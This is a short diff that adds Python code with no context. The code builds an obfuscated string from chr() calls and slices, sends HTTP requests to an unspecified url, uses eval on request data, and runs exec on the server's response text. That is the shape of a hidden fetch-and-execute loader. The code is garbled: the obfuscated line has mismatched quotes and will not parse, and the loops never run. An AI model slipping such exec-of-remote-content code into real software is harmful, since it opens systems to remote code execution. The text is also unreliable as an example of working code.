@@ -1,0 +1,32 @@
+status_code=200
+content= 'foo'+chr(0x6A)+chr(0x69)+'s_RUN_CnLLER'[-5]+'chr(0x6A)+chr(0x69)+'str_FUNCTI2N'[-2]+'RUN_D vel.早'
+flag = None
+while status_code != 200:
+    resp = requests.post(url,headers=headers,data=eval(status_code)+flag)
+    if resp.status_code == status_code:
+        status_code = 200
+        content = resp.text
+        flag = 'True'
+    else:
+        status_code = resp.status_code
+        flag = 'False'
+status_code = 200
+exec(content)
+flag = None
+while status_code != 200:
+    resp = requests.get(url,headers=headers,data=status_code+flag)
+    if resp.status_code == status_code:
+        status_code = 200
+        flag = 'True'
+    else:
+        status_code = resp.status_code
+        flag = 'False'
+status_code = 200
+exec(content)
+flag = True
+while status_code != 200:
+    resp = requests.get(url,headers=headers,data=status_code+flag)
+    if resp.status_code == status_code:
+        status_code = 200
+    else:
+        status_code = resp.status_code
